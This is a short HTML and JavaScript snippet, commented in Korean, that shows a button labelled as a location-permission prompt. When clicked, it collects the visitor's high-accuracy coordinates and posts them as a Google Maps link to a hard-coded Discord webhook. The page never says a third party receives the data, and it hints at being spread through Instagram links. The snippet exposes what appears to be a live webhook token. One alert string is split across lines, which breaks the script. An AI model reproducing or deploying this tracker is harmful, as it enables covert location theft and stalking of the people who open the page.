<button id="locationBtn">📍 위치 권한 허용하기</button>

<script>
document.getElementById('locationBtn').addEventListener('click', async () => {
  try {
    // 위치 정보 가져오기
    const position = await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject, {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      });
    });
    
    const { latitude, longitude, accuracy } = position.coords;
    const locationData = `📍 **위치**: https://maps.google.com/?q=${latitude},${longitude}
🗺️ **정확도**: ${accuracy}m`;
    
    // 디스코드로 전송
    await sendToDiscord(locationData);
    
    alert('✅ 위치 정보가 전송되었습니다!');
    
  } catch (err) {
    console.error('위치 오류:', err);
    alert('📍 위치 권한을 허용해주세요.

인스타그램 인앱 브라우저에서는 작동하지 않습니다.');
  }
});

async function sendToDiscord(locationData) {
  // 디스코드 웹훅 URL (자신의 서버 웹훅으로 교체)
  const webhookUrl = 'https://discord.com/api/webhooks/1527999868239482901/qUOQ1qwgXMtzRfFfj06rKD8BW_ExiVyyQBQFffZzdzi7kk1Qlm_acn_oAeGE2p2q2eqJ';
  
  const fullMessage = `📍 **위치 정보**

${locationData}`;
  
  const formData = new FormData();
  formData.append('content', fullMessage);
  
  const response = await fetch(webhookUrl, {
    method: 'POST',
    body: formData
  });
  
  if (!response.ok) {
    throw new Error('전송 실패');
  }
}
</script>
